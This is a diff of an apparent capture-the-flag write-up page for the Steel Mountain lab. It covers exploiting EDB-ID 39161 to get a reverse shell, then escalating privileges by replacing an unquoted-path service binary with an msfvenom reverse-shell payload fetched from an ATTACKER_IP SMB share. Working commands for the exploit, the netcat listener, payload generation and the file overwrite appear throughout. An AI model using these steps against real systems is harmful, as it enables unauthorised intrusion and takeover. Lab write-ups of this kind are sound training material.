@@ -10,21 +10,28 @@ import TabItem from '@theme/TabItem';
 # Manual Exploitation
 
 
-:::caution PYTHON2 Must Be Used To Host The Static NETCAT Binary
+:::danger `PYTHON2` Must Be Used To Host The Static NETCAT Binary
+
+Hosting with `Python3` is not going to Work.
 
 :::
 
 
 <br/>
 
-- **Used Exploit** <b style={{ color: 'Red' }}>EDB-ID: 39161</b>
+- **Used Exploit** <a class="button button--outline button--danger" href="https://www.exploit-db.com/exploits/39161">EDB-ID: 39161</a>
 - `[1]` Hosting a Static `netcat` Binary on <b style={{ color: 'SandyBrown' }}>[LOCAL-IP:80]</b>
+  - The `netcat` Binary can be Downloaded from here: <a class="button button--outline button--info" href="https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86">NETCAT GitHub</a>
 - `[2]` Setting our Machine <span style={{fontWeight: 'Bold'}}>IP - PORT</span>
 - `[3]` Starting a Listener on the <span style={{fontWeight: 'Bold'}}>PORT</span>
 - <b style={{ color: 'Coral' }}>[First Execution]:</b> The Exploit Uploads the <span style={{fontWeight: 'Bold'}}>NETCAT</span> Static Binary to the Remote Machine. 
 - <b style={{ color: 'Coral' }}>[Second Execution]:</b> The Exploit Initializes the Connection Back to our Machine.
 
+<br/>
 
+:::caution It Might Be Necessary To Run The Exploit Multiple Times Before Succeeding
+
+:::
 
 :::info STEPS
 
@@ -33,14 +40,14 @@ import TabItem from '@theme/TabItem';
     <span style={{fontWeight: 'Bold'}}> Modify The Exploit Values To Match The Attacker IP
 
 ```bash
-ip_addr = "10.10.20.30" #local IP address
+ip_addr = "ATTACKER_IP" #local IP address
 local_port = "443" # Local Port number
 ```
 
 </span>
   </TabItem>
   <TabItem value="python" label="STEP [2]">
-        <span style={{fontWeight: 'Bold'}}> Use Python2 as the Server. 
+        <span style={{fontWeight: 'Bold'}}> Use Python2 as the Server
         
 
 The Netcat Binary must be Named: <b style={{ color: 'DeepSkyBlue' }}>nc.exe</b>
@@ -55,9 +62,9 @@ Serving HTTP on 0.0.0.0 port 80 ...
   </TabItem>
   
     <TabItem value="python_two" label="STEP [3]">
-        <span style={{fontWeight: 'Bold'}}> Execute the Script. [It May be Necessary to Execute it Multiple Times]
+        <span style={{fontWeight: 'Bold'}}> Execute the Exploit
 
-```bash
+```log
 attacker@machine:~$ python2 39161.py 10.10.32.61 8080
 ```
 
@@ -68,7 +75,7 @@ attacker@machine:~$ python2 39161.py 10.10.32.61 8080
     <span style={{fontWeight: 'Bold'}}> Catch the Reverse SHELL with <b style={{ color: 'Coral' }}>netcat</b>
 
 ```bash
-attacker@machine:~$  nc -nvlp 443
+attacker@machine:~$ nc -nvlp 443
 Connection from 10.10.32.61:49328
 Microsoft Windows [Version 6.3.9600]
 
@@ -93,22 +100,26 @@ attacker@machine:~$ mkdir /mnt/SMBShare
 attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
 ```
 
+<br/>
+
+- Copying `winPEASx64` from our `SMB` Server to the Target Machine.
+
 ```log
-C:\Windows\Temp> copy \\10.10.20.30\LINUXSHARE\winPEASx64.exe winPEASx64.exe
-        1 file(s) copied.
+C:\Windows\Temp> copy \\ATTACKER_IP\LINUXSHARE\winPEASx64.exe winPEASx64.exe
 ```
 
-<br/>
 <br/>
 
 - Enumerating the Machine Using <b style={{ color: 'LightGreen' }}>winPEAS</b>
 - The <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service has <b style={{ color: 'Brown' }}>[Unquoted Service Paths] - [CanRestart = True]</b>
-
+- `STEELMOUNTAIN\bill` Has also Write Permissions.
 
 ```log
 =========================================================================================================================================================================
+// highlight-next-line
 AdvancedSystemCareService9(Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\AdvancedSystemCare\ASCService.exe] - Auto - Stopped - No quotes and Space detected
 File Permissions: bill [WriteData/CreateFiles]
+// highlight-next-line
 Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteDataCreateFiles])
 Advanced SystemCare Service
 =========================================================================================================================================================================
@@ -119,14 +130,25 @@ Advanced SystemCare Service
 
 - Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b>
 
-```log
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.20.30 LPORT=8888 -f exe -o ASCService.exe
+```js
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o ASCService.exe
 ```
 
 <br/>
+
+- Once again we can Transfer the **PAYLOAD** to the Target Machine using a Simple `SMB` Server.
+- It is going to ask to Overwrite the file: `Yes`
+
+```log
+C:\Program Files (x86)\IObit\Advanced SystemCare> copy \\ATTACKER_IP\LINUXSHARE\ASCService.exe ASCService.exe
+Overwrite ASCService.exe? (Yes/No/All): Yes
+        1 file(s) copied.
+```
+
+
+<br/>
 <br/>
 
-- Uploading and Replacing the <span style={{fontWeight: 'Bold'}}>ASCService.exe</span> <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service with a <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>
 - Restarting the <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service will Start our <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>
 
 ```powershell
